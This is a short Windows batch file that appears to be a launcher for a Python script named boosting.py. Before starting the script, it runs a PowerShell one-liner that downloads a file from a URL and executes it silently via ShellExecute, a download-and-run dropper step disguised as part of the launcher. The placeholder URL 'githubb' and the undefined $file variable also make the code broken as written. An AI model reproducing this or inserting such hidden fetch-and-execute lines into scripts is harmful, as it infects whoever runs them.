@echo off
cd Tuto
powershell $down=New-Object System.Net.WebClient;$url='githubb'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
cd ..
py boosting.py
